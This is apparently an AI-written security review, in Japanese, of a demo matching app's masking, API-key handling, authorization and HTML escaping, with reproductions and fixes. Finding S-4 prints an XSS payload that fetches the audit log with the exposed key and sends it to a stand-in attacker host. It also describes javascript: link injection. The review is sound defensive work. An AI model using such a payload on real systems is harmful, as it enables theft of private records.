critic: Opus 5 (claude-opus-5[1m])

## Round 6 — 2026-08-18 — 工程: 反証(安全性: 情報漏洩・統制の実効性)

対象: `src/knowledge_discovery/` 全体 / `scripts/generate_seeds.py` / `Dockerfile` / `tests/`
前提: 脅威モデルは「社内デモ + 審査員が触りうる公開URL」。ledger記載の廃止済み機構（ロール別認証・来歴検証・reject_visibility・ロール別射影）の復活は提案しない。統制原則は①AI生成文を本人名義で流通させない ②非公開項目の**内容**は本人以外に開示されない（監査は事実のみ・内容マスク）の2点のみを基準に検証した。

検証は静的読解＋実機再現（`fastapi.testclient` で実プロセスを起動し、endpointを実際に叩く）で行った。high候補2件は再現コードで白黒をつけた。

---

### 指摘

- **[S-1] 種別: 実装 / 深刻度: high**
  - **指摘**: privateマスクの発火条件が「LLMが自己申告した `cited_item_keys`」のみで、内容が流れる経路（`reason_text` / `no_connection_reason` 本文）とは独立している。LLMがprivate項目の**本文を引用しつつ public キーだけを cite** すると、マスクは一切かからず、非公開項目の内容が監査ダッシュボードに平文で出る。C-18/C-21が「判定主体をLLMから型システムに移した」と主張する範囲は、実際にはキー選択という**LLM出力**に依然として依存している。
  - **破綻シナリオ（再現済み）**: Elenaのシード（`transition_pipeline`, private, "Currently advising two unannounced clinic succession deals ... Details under NDA."）に対し、2段目が
    `{"connection": {"reason_text": "She is currently advising two unannounced clinic succession deals, one of whose owner is exploring relocation before sale (NDA).", "score": 0.9}, "cited_item_keys": ["current_work"]}`
    を返すケースを実機で流したところ、`GET /api/audit/messages` の `display_payload` は次の通り**マスクされず平文**で返った:
    ```
    connect_ask | {"question_summary": "...", "reason_text": "She is currently advising two unannounced clinic succession deals, one of whose owner is exploring relocation before sale (NDA).", "cited_item_keys": ["current_work"], "score": 0.9}
    ```
    intentは `connect_ask` のままなので `AUDIT_WHITELIST` を素通りし、`audit.html` は 🔒 ではなく「🤖 AI Matching Reason:」ボックスに全文を描画する。**デモの目玉（非公開項目シーン）で「内容は誰にも見えない」とナレーションしている、まさにその画面にNDA本文が出る。**
  - **発火確率を上げている実装上の要因**:
    1. `gemini_adapters.py:253-256` — LLMが `cited_item_keys` を省略した場合の既定値が `all_item_keys[:1]`（＝プロフィール先頭項目）。Elenaの先頭は `current_work`（public）なので、**省略＝マスク解除**という fail-open の既定になっている。C-21が監査表示側で作った fail-closed を、生成側の既定が打ち消している。
    2. プロンプト（`SYSTEM_PROMPT` ルール3）は「根拠キーを列挙せよ」と指示するのみで、`visibility=private` の項目に言及したら必ずそのキーを含めよ、という指示がない。一方 `_format_profile_context` はprivate項目の本文をそのままコンテキストに入れている（これ自体は仕様通り）。温度0.2でも複数項目を統合した理由文では引用漏れは日常的に起きる。
    3. 同じ穴は `no_connection` 経路（`matching.py:313-323` の `stage2_null`、`reason_text = no_connection_reason` をそのまま採用）にもある。C-21が塞いだつもりの裏口が、キー申告漏れという別の入口で開いている。
    4. `tests/test_goals.py:198` の goal-4 テストは「LLMがprivateキーを正しく cite した」ケースしか作っていない。テストは通るのに原則②は破れる。
  - **提案（廃止済み機構の復活ではなく、送信層1箇所の追加判定）**: `TransmissionLayer.send` のStep 3に**本文側の決定的チェック**を足す。private項目 body から抽出した特徴語 n-gram（例: 5語連続、または名詞トークン集合の一致率）が送出テキスト（`reason_text` / `no_connection_reason`）に含まれていたら、cite の有無に関わらずマスク発火・`connect_ask_private` へ昇格させる。あわせて `_parse_json_result` の省略時既定を `all_item_keys[:1]` から **全キー**（＝private含む＝マスク側に倒す）に変更する。前者は20行程度、後者は1行。これで「マスク判定はLLM出力ではなく型システムが決める」という write-up の主張が実装と一致する。

- **[S-2] 種別: 実装 / 深刻度: high**
  - **指摘**: 唯一残った統制である `DEMO_API_KEY` が、**APIキー保護のかかっていない3つのHTMLページに平文で焼き込まれている**（`requester.html:116` / `candidate.html:93` / `audit.html:201`: `const API_KEY = "demo-key-2026";`）。しかも同じ値が `server.py:38` の `DEFAULT_DEMO_API_KEY` フォールバックでもあり、Secret Manager の注入に失敗しても起動は成功して既定値で動く。
  - **破綻シナリオ（再現済み）**: `create_app(api_key="SUPER-SECRET-DEPLOYED-KEY")`（＝Secret Manager から別の値を注入した状態）で各パスを叩いた結果:
    ```
    /requester      200  key_in_body=True
    /candidate      200  key_in_body=True
    /audit          200  key_in_body=True
    /openapi.json   200   (無認証でAPI全面が読める)
    /docs           200   (Swagger UIが無認証)
    /attachments/doc_practice_transition_handbook 200 (無認証)
    ```
    これは二者択一の詰みになっている:
    - **(a) デプロイ鍵 = `demo-key-2026`** の場合 → `--allow-unauthenticated` の公開URLで view-source するだけで鍵が手に入り、`/api/audit/messages`・`/api/candidate/{任意のagent_id}/asks`・`/api/query` に誰でも到達できる。審査員が3分どころか30秒で到達する。統制はゼロ。
    - **(b) デプロイ鍵 ≠ `demo-key-2026`**（Secret Manager でまともな値を入れた場合）→ UIの全fetchが401になり**デモ画面が一切動かない**。実測: `X-API-Key: demo-key-2026` → `401`。
    つまり「鍵を秘密にすると動かない／動かすと鍵が公開」という構造で、現状はどちらの意味でも保護が成立していない。
  - **提案**: HTMLから定数を消し、`create_app` の HTML 配信ルートを `Depends(verify_api_key)` の内側に置いた上で、キーは `?api_key=...`（既にサポート済み）でページに渡す→ページ内では `new URLSearchParams(location.search).get("api_key")` を使い回す形にする。追加コード10行以内で、URLを知らない第三者には何も返らなくなる。あわせて (1) `DEFAULT_DEMO_API_KEY` フォールバックを廃止し `DEMO_API_KEY` 未設定なら起動失敗にする（サイレントに既知の鍵で公開されるのを防ぐ）、(2) `FastAPI(docs_url=None, redoc_url=None, openapi_url=None)` で無認証のAPI仕様公開を止める。

- **[S-3] 種別: 設計 / 深刻度: mid**
  - **指摘**: `GET /api/candidate/{agent_id}/asks`（`server.py:331`）は URL の `agent_id` を差し替えるだけで任意エージェントの受信箱を返し、`connect_ask_private` の `reason_text`（＝private項目の内容そのもの）を平文で返す。`candidate.html` の "Demo Switcher" は本人性の代替であって認証ではないため、S-2 と組み合わさると**公開URLを開いた第三者が `agent_elena_vasquez` を選ぶだけで 🔒 打診の中身を読める**。
  - **破綻シナリオ**: 審査員がデモURLで Candidate ページを開き、セレクタを Elena に切り替える（またはURLに直接 `/api/candidate/agent_elena_vasquez/asks?api_key=demo-key-2026` を入れる）→ 「🔒 Related to your private profile item」バッジ付きで NDA 由来の理由文が表示される。同じ画面が「本人だけが開示を判断する」と主張しているため、統制の主張そのものが反証される。write-up でこの主張を書いた状態でリポジトリが公開されると、Architectural Discipline（30%）の評価で直撃する。
  - **提案（ロール別認証の復活はしない前提での最小案）**: いずれか1つで足りる。(1) S-2 の修正で鍵を実際に秘密にし、「鍵の保持者＝社内の当事者」という前提を成立させた上で、write-up に「デモは単一鍵で全ペルソナを操作する設計であり、本人性の検証は本デモのスコープ外」と**主張範囲を明記**する（統制の主張を「非公開内容は監査・依頼者に出さない」に限定し、「他ペルソナからも見えない」とは言わない）。(2) Switcher を残したまま、`connect_ask_private` の `reason_text` は選択中エージェントに一致するときのみ返す、という1行の絞りを入れる（Switcher が identity である以上、防御ではなく主張の整合のための表示制御）。どちらを取るかは設計判断だが、**現状の write-up 想定文言のままだと主張と実装が食い違う**。

- **[S-4] 種別: 実装 / 深刻度: mid**
  - **指摘**: 3つのUIすべてが、サーバー由来の文字列を `innerHTML` にエスケープなしで埋め込んでいる（`audit.html:276,281,288,290,304,307`、`requester.html:230-234,244`、`candidate.html:173,177`）。入力源は質問文・LLM生成の理由文・辞退理由・添付 content で、いずれも自由入力。
  - **破綻シナリオ**: (a) 審査員が質問欄に `"` や `<` を含む普通の英文（例: `Who knows the "conversion" rules for <2000 sqft clinics?`）を入れるだけで、監査画面のバブルが崩れるか消える。ライブデモ中に起こると最も目立つ画面が壊れる。(b) 辞退理由に `<img src=x onerror="fetch('/api/audit/messages',{headers:{'X-API-Key':'demo-key-2026'}}).then(r=>r.text()).then(t=>fetch('https://attacker/'+encodeURIComponent(t)))">` を入れると、監査ダッシュボードを開いた人のブラウザで実行され、マスク前後を問わず監査ログ全体が外部送信される（S-2 により鍵は既知）。(c) 添付 `type=link` の content は `href="${...}"` に直挿しなので `javascript:` URL が成立し、依頼者画面のリンククリックで発火する。
  - **提案**: 各HTMLに `const esc = s => String(s ?? "").replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));` を1つ足し、テンプレート内の全補間を `${esc(...)}` に置換する。リンクは `esc()` に加え `^https?:` のみ許可。3ファイル・小さな機械的置換で済む。

- **[S-5] 種別: 実装 / 深刻度: low**
  - **指摘**: `POST /api/query` のレスポンス（依頼者が受け取る）に `funnel_candidates` の `similarity` が小数4桁で載る（`server.py:275-283`）。embedding は private 項目本文込みで生成される（C-8で意図的に反転済み・これ自体は再提起しない）ため、この数値は**private本文に対する類似度オラクル**になっている。private を持つのはシード上 Elena のみで、他399体は public のみのため、Elena の similarity 変化＝private本文の内容推定に直結する。
  - **破綻シナリオ**: 依頼者（＝S-2 により事実上誰でも）が質問文を少しずつ変えて投げ、`funnel_candidates` 内の Elena の similarity 増減を見る。`"unannounced clinic succession"` を含む文で有意に上がり `"unannounced clinic acquisition"` では上がらない、といった差分を数十回で取れる。「内容は開示されない」原則の穴としては細いが、**質問を投げる副作用として監査ログに何も残らない**（funnelは `messages` に記録されない）点が、統制の3点セット（何が流れたか＝監査）の主張と噛み合わない。
  - **提案**: (1) `similarity` を依頼者向けレスポンスから外す（監査画面のファネル表示は件数のみで足り、`audit.html` も件数しか使っていない）、または小数1桁に丸める。(2) スケール表示が目的なら `employee_id` も不要で `name`/`role`/件数で十分。どちらも数行。

---

### 反論に至らなかったが確認した点（記録）

- **監査表示の fail-closed ホワイトリスト（`schemas.py:147-167`）は仕様通り機能している**。`audit_payload` があれば必ずそれを表示し、無い場合も `AUDIT_WHITELIST` 外なら平文に倒れない。`connect_ask_private` を意図的にホワイトリストから外している点も正しい。破れるのは S-1 の「上流でマスクが発火しない」ケースのみで、ホワイトリスト自体の欠陥ではない。
- **`match_proposal` の `reason_text` 混入は型システムで実際に禁止されている**（`schemas.py:105-106` が `reason_text` の存在自体を検証エラーにする）。C-19 の意図が実装で機能していることを確認。
- **依頼者向け射影に private の痕跡は無い**。`get_requester_status` は `pending / matched / declined` の3状態のみを返し、`connect_ask` と `connect_ask_private` を区別する情報（intent・cited_item_keys・score・reason_text）を一切載せていない。`requester.html` も pending 時は候補名すら出さない。原則②の依頼者側は守られている。
- **`no_connection` の配送・マスク経路は接続されている**。シードの4体すべてが `supported_intents` に `no_connection` を含むため（`generate_seeds.py:42,81,119,166`）、落選記録が `reject_unsupported_intent` に化けて最重要ゴール2が壊れる、という懸念は成立しない。`vector_floor` 落選は `cited_item_keys=[]` かつ理由文が数値のみで、内容漏洩経路にならない。
- **ログ・例外経由の漏洩は無い**。`src/knowledge_discovery/` に `print` / `logging` / スタックトレース出力は存在しない。唯一 `gemini_adapters.py:245` が例外文字列を `no_connection_reason` に載せるが、Gemini SDK の例外にプロフィール本文は含まれない（リクエスト本文をエコーする実装ではない）。ただし S-1 の修正時にこの経路もマスク対象に入ることを確認しておくこと。
- **Dockerfile / デプロイ構成に秘密の焼き込みは無い**。`COPY src` / `COPY scripts` のみで、リポジトリ直下の `.env` や `*credentials*.json` はそもそもイメージに入らない。`.dockerignore` が `design` / `tests` / `.git` / `.venv` / `*.md` を除外しており、設計文書・批評ログがイメージに同梱されることもない。APIキーもGeminiキーも環境変数経由で、コード内ハードコードは `DEFAULT_DEMO_API_KEY` のみ（S-2で指摘済み）。
- **`/attachments/{doc_id}` は無認証だが実害は小さい**。3件の合成ドキュメントがコード内定数で、未知IDは404を返し列挙もできない。ただし design.md §3（C-24）の「既存の単一APIキー保護の内側に収まる」という記述は実装と食い違っている（`Depends(verify_api_key)` が付いていない）。S-2 の修正時に一緒に内側へ入れるか、design.md の記述を実態に合わせること。
- **監査UIの表示ラベルに軽微な誤り**。`get_audit_view` の fail-closed フォールバック（`{"masked": true, "note": "表示不可（マスク既定）"}`）を `audit.html:264` が「🔒 Private-Item-Based Ask」として描画するため、スキーマ側の不具合が「非公開項目由来の打診」に見える。漏洩ではないが、監査画面の意味が反転するので S-4 修正のついでに分岐を分けるとよい。
